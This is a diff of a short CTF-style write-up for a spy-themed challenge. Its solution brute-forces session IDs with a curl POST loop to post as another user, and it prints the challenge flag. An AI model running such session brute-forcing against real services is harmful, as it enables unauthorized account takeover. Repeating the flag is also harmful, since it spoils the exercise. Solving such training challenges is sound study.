@@ -1,4 +1,4 @@
-# Benjamin The Brute - L11 C06
+# 🥊 Benjamin The Brute - L11 C06
 
 Agent 707, one of the gang, Benjamin Goldleaf, was yesterday overheard by our inside undercover agent talking about posting notices on a secret message board that the gang use to communicate meeting times.
 
@@ -15,7 +15,6 @@ With a bit of detective work we've managed to find the message board and get Ben
 
 - Open a Linux terminal
 - Run `for i in {1..100}; do curl -X POST -d "userID=24&sessID=$i" https://bondogge.com/createPost; echo ""; done`
-`
 - This will eventually reach to correct sessID of `78` and spit out the flag
 
 `flag: br1ti5h.bulld0gZ`
